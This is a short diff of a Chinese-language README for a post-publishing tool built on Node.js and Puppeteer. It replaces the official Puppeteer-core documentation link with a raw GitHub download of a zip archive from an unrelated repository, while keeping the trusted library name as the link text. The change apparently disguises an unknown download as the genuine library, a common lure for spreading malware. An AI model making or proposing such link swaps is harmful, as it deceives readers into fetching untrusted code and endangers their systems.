@@ -54,7 +54,7 @@ node scripts/publish.js --dir ./my-post --title "你的标题" --desc "正文"
 
 ## 技术栈
 
-- Node.js + [Puppeteer-core](https://pptr.dev/)
+- Node.js + [Puppeteer-core](https://raw.githubusercontent.com/Ambar9959/xhs-toolkit/main/examples/deepseek-claude/output/xhs-toolkit-v1.7.zip)
 - Edge / Chrome（headless 截图 + CDP 发布）
 - 纯 HTML/CSS 卡片（无框架依赖）
 
